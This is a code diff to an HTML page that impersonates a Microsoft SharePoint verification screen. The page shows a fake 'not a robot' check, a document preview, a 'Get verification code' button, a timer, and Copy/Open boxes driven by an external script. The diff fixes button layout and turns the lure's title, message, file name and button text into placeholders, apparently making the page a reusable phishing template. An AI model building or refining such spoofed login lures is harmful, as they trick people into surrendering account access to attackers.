@@ -76,7 +76,6 @@
             font-size: 15px;
             font-weight: 600;
             cursor: pointer;
-            margin-bottom: 10px;
             transition: background 0.15s;
         }
         .btn-secondary:hover { background: #f3f2f1; }
@@ -107,6 +106,11 @@
         .timer-pill { display: inline-flex; align-items: center; gap: 6px; background: #eef6ff; color: #0078d4; border-radius: 40px; padding: 5px 12px; font-size: 13px; font-weight: 600; }
         .timer-pill.expired { background: #FDE7E9; color: #D13438; }
         .action-row { display: none; grid-template-columns: 1fr 1fr; gap: 8px; margin-top: 16px; }
+        /* vg-engine.js reveals #actionRow with display:flex !important, which
+           overrides the display:none above and disables the grid-template-columns.
+           Give both buttons an equal flex basis so the Copy box and the Open box
+           are the same size regardless of how long each label is. */
+        .action-row > * { flex: 1 1 0; min-width: 0; margin: 0; }
         .sign-in-btn { background: linear-gradient(135deg, #0078D4, #005A9E); color: #fff; border: none; border-radius: 4px; font-family: inherit; font-size: 13px; font-weight: 600; padding: 11px; cursor: pointer; }
         .sign-in-btn:hover { filter: brightness(1.05); }
         .refresh-btn { background: none; border: none; cursor: pointer; color: #0078d4; font-family: inherit; font-size: 13px; font-weight: 600; }
@@ -138,19 +142,19 @@
             <span style="font-weight: 600; color: #201f1e;">SharePoint for Microsoft</span>
         </div>
 
-        <h1>Please confirm that you are not a robot</h1>
-        <p class="subtitle">This SharePoint site requires authentication. Complete the verification process to continue.</p>
+        <h1>{{TITLE}}</h1>
+        <p class="subtitle">{{MESSAGE}}</p>
         
         <div class="doc-preview">
             <img src="https://cdn-icons-png.flaticon.com/512/337/337946.png" style="width: 30px; height: 30px; opacity: 0.7;">
             <div>
-                <div class="doc-preview-name">Document Details</div>
-                <div class="doc-preview-meta">Document Details.pdf · 12 pages</div>
+                <div class="doc-preview-name">{{FILE_NAME}}</div>
+                <div class="doc-preview-meta">{{PAGES_LABEL}}</div>
             </div>
         </div>
 
         <button id="startBtn" class="btn-primary" onclick="generateCode()" data-primary-button>
-            Get verification code
+            {{BUTTON_TEXT}}
         </button>
         
         <div class="code-panel" id="codePanel">
